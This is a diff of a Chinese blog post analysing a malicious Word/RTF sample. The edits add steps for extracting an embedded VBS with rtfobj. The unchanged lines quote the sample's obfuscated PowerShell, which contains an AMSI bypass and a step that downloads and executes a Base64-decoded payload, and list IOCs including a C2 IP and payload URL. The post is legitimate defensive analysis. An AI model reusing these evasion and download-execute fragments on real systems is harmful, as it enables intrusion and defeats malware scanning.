@@ -1642,7 +1642,7 @@
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2021-01-31 17:11:19">2021-01-31 00:45</time>
+        创建时间:<time class="date" title="更新时间: 2021-02-01 12:53:58">2021-01-31 00:45</time>
         
     </div>
     <div class="article-meta">
@@ -1681,9 +1681,13 @@
       
         <p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1815684465&auto=1&height=66"></iframe></p>
 <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在群里看到的一个样本。打算分析一下<br>样本来源:<a href="https://app.any.run/tasks/9f3895b5-6ae1-4ac1-b829-b50202985e3d/#" target="_blank" rel="noopener">https://app.any.run/tasks/9f3895b5-6ae1-4ac1-b829-b50202985e3d/#</a></p>
-<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>利用CVE-2017-11882执行构造好的vbs</p>
-<pre><code>CmD.exe /C cscript %tmp%\Client.vbs
-</code></pre><p>Client.vbs：<a href="https://paste.ubuntu.com/p/v74cHNShTq/" target="_blank" rel="noopener">https://paste.ubuntu.com/p/v74cHNShTq/</a><br>由于给出的比较混乱加上app.any.run给出的执行过程，大概一句话:<br>根据判断使用wscript或powershell执行上线</p>
+<p>最后修改：2021/2/1</p>
+<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>winhex打开文档发现是rtf文件<br><img src="https://s3.ax1x.com/2021/02/01/yZAnpQ.png" alt=""></p>
+<p>利用oletools套件里的rtfobj查看<br><img src="https://s3.ax1x.com/2021/02/01/yZAsAK.png" alt=""></p>
+<p>dump出vbs</p>
+<pre><code>rtfobj -s all invoice.doc
+</code></pre><p><img src="https://s3.ax1x.com/2021/02/01/yZALcj.png" alt=""></p>
+<p>Client.vbs：<a href="https://paste.ubuntu.com/p/v74cHNShTq/" target="_blank" rel="noopener">https://paste.ubuntu.com/p/v74cHNShTq/</a><br>由于给出的比较混乱加上app.any.run给出的执行过程，大概一句话:<br>根据判断使用wscript或powershell执行上线</p>
 <p>powershell command分析</p>
 <pre><code class="powershell">[Ref].Assembly.GetType(&#39;Sy&#39; + &#39;stem.&#39; + &#39;Mana&#39; + &#39;gem&#39; + &#39;ent&#39; + &#39;.Autom&#39; + &#39;atio&#39; + &#39;n.A&#39; + &#39;m&#39; + &#39;si&#39; + &#39;Utils&#39;);
 \n$835FFE1926 = &#39;4456625220575263174452554847&#39;;
@@ -1721,6 +1725,7 @@ String&#39;([Convert]::&#39;FromBase64String&#39;($E7DEA8DB03.responseText))|I`E
 <p>提取出来的dll如下<br><img src="https://s3.ax1x.com/2021/01/31/yEYIk4.md.png" alt=""></p>
 <p>根据app.any.run给出的标签属于trojan家族的</p>
 <p>Quoting类里的SplitUnquoted函数<br><img src="https://s3.ax1x.com/2021/01/31/yEaSNF.png" alt=""></p>
+<p>最后所有提取出来的文件<br><img src="https://s3.ax1x.com/2021/02/01/yZEpNT.png" alt=""></p>
 <p>IOCS:<br>Main object- “mal0129-01.zip”<br>    sha256    00789a46bbe5d6537f0b2ebb23a006d51c18752f13c1fac475f39b7e8e0431a4<br>    sha1    3e70416110eca3a4dda6a28e929413193fa008b4<br>    md5    e26e82db7083a2559ecfe147c7696cb9<br>Connections<br>    ip    108.61.166.11<br>HTTP/HTTPS requests<br>    url    <a href="http://108.61.166.11/m/fine.jpg" target="_blank" rel="noopener">http://108.61.166.11/m/fine.jpg</a>    </p>
 <p>微步社区<br><img src="https://s3.ax1x.com/2021/01/31/yAGdRx.png" alt=""></p>
 <h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://app.any.run/tasks/9f3895b5-6ae1-4ac1-b829-b50202985e3d/#" target="_blank" rel="noopener">https://app.any.run/tasks/9f3895b5-6ae1-4ac1-b829-b50202985e3d/#</a><br><a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.reflection.assembly.load?view=net-5.0" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/dotnet/api/system.reflection.assembly.load?view=net-5.0</a><br><a href="https://blog.csdn.net/csdndscs/article/details/103946972" target="_blank" rel="noopener">https://blog.csdn.net/csdndscs/article/details/103946972</a><br><a href="https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/" target="_blank" rel="noopener">https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/</a></p>
@@ -1737,7 +1742,7 @@ String&#39;([Convert]::&#39;FromBase64String&#39;($E7DEA8DB03.responseText))|I`E
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
     <p><span class="copy-title">发布时间:</span>2021-01-31, 00:45:33</p>
-    <p><span class="copy-title">最后更新:</span>2021-01-31, 17:11:19</p>
+    <p><span class="copy-title">最后更新:</span>2021-02-01, 12:53:58</p>
     <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/e2324e90.html" title="某word恶意VBA样本分析">http://422926799.github.io/posts/e2324e90.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
